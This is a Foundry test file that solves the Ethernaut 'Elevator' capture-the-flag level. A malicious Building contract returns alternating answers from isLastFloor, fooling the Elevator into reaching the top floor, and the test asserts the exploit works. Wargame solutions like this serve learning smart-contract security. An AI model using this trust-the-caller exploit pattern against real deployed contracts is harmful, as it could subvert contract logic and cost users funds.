// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Elevator.sol";

contract ExploitBuilding is Building {
    bool _isLastFloor = true;

    function isLastFloor(uint) external returns (bool) {
        _isLastFloor = !_isLastFloor;
        return _isLastFloor;
    }

    function exploit(address _elevator) external {
        Elevator(_elevator).goTo(10);
    }
}


contract TestElevator is Test {
    ExploitBuilding exploitBuilding;
    Elevator elevator;

    function setUp() external {
        elevator = new Elevator();
        exploitBuilding = new ExploitBuilding();
    }

    function testExploit() external {
        assertEq(elevator.top(), false);
        exploitBuilding.exploit(address(elevator));
        assertEq(elevator.top(), true);
    }
}
